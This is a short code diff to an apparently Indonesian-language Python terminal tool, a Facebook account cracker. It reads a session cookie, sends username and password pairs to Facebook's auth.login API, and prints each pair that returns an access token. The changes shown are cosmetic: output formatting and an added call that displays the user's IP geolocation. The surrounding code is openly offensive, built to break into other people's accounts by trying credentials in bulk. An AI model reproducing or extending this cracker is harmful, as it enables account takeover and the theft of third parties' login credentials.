@@ -47,7 +47,7 @@ def IP():
         sp = " "
     print("\033[93m[▪]IP \033[91m= " + ip)
     print("\033[96m[▪]Negara \033[91m= " + ng)
-    print("\033[93m [▪]Provinsi \033[91m= " + pr)
+    print("\033[93m[▪]Provinsi \033[91m= " + pr)
     print("\033[92m[▪]Kota \033[91= " + kt)
     print("\033[92m[▪]Zona Waktu \033[91m= " + tz)
     print("\033[94m[▪]Kartu Yang Anda Gunakan \033[91m= " + sp)
@@ -108,6 +108,7 @@ def mbfv2():
                     cek = open("cookies").read()
              except FileNotFoundError:
                    lupo_lupo_milzu()
+                   IP()
                    peak()
                    cek = input("\n\033[0;92m       [ \033[92mServer ini menggunakan Cokiee \033[0;92m]\n\n\033[90m [\033[91m>_<\033[90m] \033[96mCokiee \033[1;91m~> \033[1;96m")
                    print('\n\033[97m [\033[92m*\033[97m] \033[92mHarap bersabar...')
@@ -152,7 +153,7 @@ def mbfv2():
              api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
              if 'EAA' in response.text:
-                 print(f"\r\033[1;92m  * --> {username}|{password}                       ",end="")
+                 print(f"\r\033[1;92m  * 👉 {username}[▪]{password}                       ",end="")
                  print()
                  result += 1
                  if cek:
